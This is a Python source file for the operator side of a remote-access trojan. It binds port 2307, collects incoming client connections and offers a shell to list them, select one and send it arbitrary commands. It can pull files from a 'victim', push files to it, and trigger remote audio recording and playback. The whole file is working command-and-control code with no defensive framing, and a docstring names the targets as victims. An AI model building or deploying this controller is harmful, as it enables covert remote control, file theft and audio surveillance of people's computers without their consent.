import socket
import sys
import os
import re
from threading import Thread
from queue import Queue
import math

def clear_screen():
	if os.name=="nt":
		os.system("cls")
	else:
		os.system("clear")

class Server:

	def __init__(self,host="",port=2307):
		try:
			self.socket_obj = socket.socket(family=socket.AF_INET,type=socket.SOCK_STREAM)
			self.socket_obj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			self.host = host
			self.port = port
		except socket.error as msg:
			print("Socket creation error: {}".format(str(msg)))

	def bind(self):
		'''
			This function is to bind port with our socket and then
			start listening on that port
		'''
		try:
			print("Binding to port {} ...".format(self.port))
			self.socket_obj.bind(( self.host, self.port ))
			
			# One argument is listen function is the no. of unaccepted connection allowed before refusing new connections
			print("Listening...")
			self.socket_obj.listen(5)
		except socket.error as msg:
			print("Socket Binding error {}".format(str(msg)))
			print("Retrying...")
			self.bind()

	def accept_connections(self):
		global ALL_CONNECTIONS
		'''
			This function is for Establishing Connections before that socket must be listening
		'''
		while True:
			try:
				conn, address = self.socket_obj.accept()
				self.socket_obj.setblocking(1) # to prevent timeout
				ALL_CONNECTIONS.append( (conn,address) )
				# print("Connection has been established! | {}:{}".format(address[0],address[1]))
			except:
				print("Error in accepting connections")

	@staticmethod
	def send_target_commands(conn):
		'''
			in this function we are sending commands to our Friend/Victim/Client
			whose connection object is passed inside function arguments
		'''
		global FILES_ROOT_PATH
		# We have to run an infinite loop to set persistence after one command unless after this function call conn is closed
		while True:
			# try:
			command = input()
			if command.strip()=="quit":
				break
			elif re.fullmatch("download [\w.]+",command.strip())!=None:
				filename = re.fullmatch("download ([\w.]+)",command.strip()).group(1)
				conn.sendall( str.encode( "-send_file {}".format(filename), "utf-8" ) ) #send triger
				client_reponse = str( conn.recv(1024), "utf-8" ).split("|")
				if client_reponse[0]=="file_found":
					print("File {} Exists".format(filename))
					data = RecvFile(conn)
					if data:
						if not os.path.exists('files'):
							os.makedirs('files')
						with open( FILES_ROOT_PATH + "/" + filename, "wb" ) as file:
							file.write( data )
						print("File {} Downloaded".format(filename))
					print( client_reponse[1], end="" )
				else:
					print("File not exists!")
					print( client_reponse[1], end="" )

			elif re.fullmatch("play [\w.:]+",command.strip())!=None:
				filename = re.fullmatch("play ([\w.:]+)",command.strip()).group(1)
				conn.sendall( str.encode("-play {}".format(filename)) )
				client_reponse = str( conn.recv(20480), 'utf-8' )
				if client_reponse=="playing":
					print("Playing...")
				else:
					print("Error while playing")
				client_reponse = str( conn.recv(20480), 'utf-8' )
				print(client_reponse, end="")
			elif re.fullmatch("record [1-9]\d*",command.strip())!=None:
				duration = re.fullmatch("record ([1-9]\d*)",command.strip()).group(1)
				conn.sendall( str.encode("-record {}".format(duration)) )
				client_reponse = str( conn.recv(20480), 'utf-8' )
				if client_reponse=="recording":
					print("Recording...")
				else:
					print("Error while recording")
				client_reponse = str( conn.recv(20480), 'utf-8' )
				print(client_reponse, end="")

			elif len(str.encode(command)) > 0:
				conn.sendall( str.encode(command) )
				client_reponse = str( conn.recv(204800), "utf-8" )
				print(client_reponse, end="")
			# except:
				# print("Error sending commands")
				# break 

	def start(self):
		self.bind()
		self.accept_connections()


def RecvFile(conn,chunk_size=404800):
	# Recv Size of File
	response = conn.recv(chunk_size)
	file_size = b''
	if str(response,"utf-8")[-1]!="C":
		while str(response,"utf-8")[-1]!="C":
			file_size += response
			response = conn.recv(chunk_size)
	else:
		file_size += response

	file_size = str(file_size,"utf-8")[:-1:]
	if file_size.isnumeric():
		file_size = int(file_size) 
		conn.sendall( str.encode("OK") )
	else:
		return False


	data_received = b''
	if file_size:
		print("Receiving a file of {:.2f} MB\n".format( (file_size/1024)/1024 ) )
		remaining_data = file_size - len(data_received) 
		response = conn.recv( chunk_size if chunk_size < remaining_data else remaining_data )
		while response:
			data_received += response
			conn.sendall( str.encode("OK","utf-8") )
			total_width = 20
			prercentage_completed = ( len(data_received)/file_size)*100
			completed_width = math.ceil( (total_width*prercentage_completed)/100 )
			remaining_width = total_width - completed_width
			if len(data_received)!=file_size:
				print( "|" + "\033[44m \033[0m"*completed_width + " "*remaining_width + "| {0:.2f}%".format(prercentage_completed), end="\r" )
			else:
				print( "|" + "\033[44m \033[0m"*completed_width + " "*remaining_width + "| {}%".format(prercentage_completed) )
				print("Download Complete.")
				return data_received

			remaining_data = file_size - len(data_received) 
			response = conn.recv( chunk_size if chunk_size < remaining_data else remaining_data )
	else:
		print("File is Empty")
		return False

def SendFile(conn,file,chunk_size=404800):
	data = file.read(chunk_size)
		
	total_size = os.path.getsize(file.name)
	data_sended = 0
	print("Sending a {:0.2f} MB file...\n".format( (total_size/1024)/1024 ) )
	
	conn.sendall( str.encode( str(total_size)+"C", "utf-8" ) ) # Send Size of File to Client
	try:
		response = conn.recv(2)
		if str(response,"utf-8")!="OK":
			print("Something Went Wrong on Clint Side!")
			return False
	except Exception as msg:
		print(msg)
		return False

	if not data:
		print("File is Empty")
		return False

	while data:
		conn.sendall( data )
		reponse = conn.recv(2)
		try:
			if str(reponse,"utf-8")=="OK":
				data_sended += len(data)
				data = file.read(chunk_size)
				total_width = 20
				prercentage_completed = (data_sended/total_size)*100
				completed_width = math.ceil( (total_width*prercentage_completed)/100 )
				remaining_width = total_width - completed_width
				if data_sended!=total_size:
					print( "|" + "\033[44m \033[0m"*completed_width + " "*remaining_width + "| {0:.2f}%".format(prercentage_completed), end="\r" )
				else:
					print( "|" + "\033[44m \033[0m"*completed_width + " "*remaining_width + "| {}%".format(prercentage_completed) )
					print("Upload Complete.")
					return True
			else:
				print("Something Went Wrong on Clint Side!")
				return False
		except Exception as msg:
			print(msg)
			return False


def list_connections():
	global ALL_CONNECTIONS
	active_clients = []
	for i,conn in enumerate(ALL_CONNECTIONS):
		try:
			conn[0].sendall(str.encode("  "))
			conn[0].recv(201480)
		except:
			del ALL_CONNECTIONS[i] #delete inactive clients
			continue
		
		active_clients.append( conn )
	
	if active_clients:
		print("-----Clients-----")
		for i,conn in enumerate(active_clients):
			print("{}- {}:{}".format(i+1,conn[1][0],conn[1][1]))
	else:
		print("No client is active!")

def get_target(cmd):
	global ALL_CONNECTIONS
	try:
		conn = ALL_CONNECTIONS[int(cmd)]
		return conn
	except:
		return None

def create_worker():
	global NUMBER_OF_THREADS
	global THREADS
	for _ in range(NUMBER_OF_THREADS):
		t = Thread(target=work)
		THREADS.append(t)
		t.daemon = True
		t.start()

def work():
	global JOB_QUEUE
	while True:
		x = JOB_QUEUE.get()
		if type(x)==tuple and x[0]==1:
			server = Server(port=x[1])
			server.start()
		else:
			if(start_shell()):
				exit()

	JOB_QUEUE.task_done()

def create_job():
	global JOB_NUMBER, JOB_QUEUE
	for x in JOB_NUMBER:
		JOB_QUEUE.put(x)

	
def start_shell():
	global FILES_ROOT_PATH
	while True:
		cmd = input("--:--> ").strip()
		if cmd=="list":
			list_connections()
		elif cmd=="clear":
			clear_screen()
		# For send file to clients
		elif re.fullmatch("send_file [\w.]+",cmd)!=None:
			filename = re.fullmatch("send_file ([\w.]+)",cmd).group(1)
			list_connections()
			selected_conn = input("Enter Client No.: ")
			if re.fullmatch("\s*(\d)\s*",selected_conn)!=None:
				target = get_target( int( re.fullmatch("\s*(\d)\s*",selected_conn).group(1) ) - 1 )
				if target:
					conn, address = target
					print("==> ", FILES_ROOT_PATH + '/' + filename);
					if os.path.isfile(FILES_ROOT_PATH + "/" + filename):
						with open(FILES_ROOT_PATH + "/" + filename,"rb") as file:
							# Send a msg so that client start receiving
							conn.sendall( str.encode( "-recv_file {}".format(filename) ,"utf-8") )
							SendFile(conn,file)
							
					else:
						print("File Not Exist!")
				else:
					print("Invlid Selection")
			else:
				print("Invalid Selection")
		elif re.fullmatch("select\s+(\d+)", cmd)!=None:
			selected_client_no = int(re.fullmatch("\s*select\s+(\d+)\s*", cmd).group(1))
			target = get_target(selected_client_no-1)
			if target is not None:
				conn, address = target
				print("You are now connected to {}:{}".format(address[0],address[1]))
				print("{}> ".format(address[0]) ,end="")
				Server.send_target_commands(conn)
			else:
				print("Invalid Selection")
		elif cmd=='exit':
			return exit()
		else:
			print("Invalid Command")


if __name__=="__main__":
	THREADS = []
	NUMBER_OF_THREADS = 2
	JOB_NUMBER = [(1,2307)]
	# JOB_NUMBER = [(1,2307),(1,2308),(1,2309),2]
	JOB_QUEUE = Queue()
	ALL_CONNECTIONS = []
	FILES_ROOT_PATH = "files"
	create_worker()
	create_job() 
	for conn in ALL_CONNECTIONS:
		conn.close()
	start_shell()


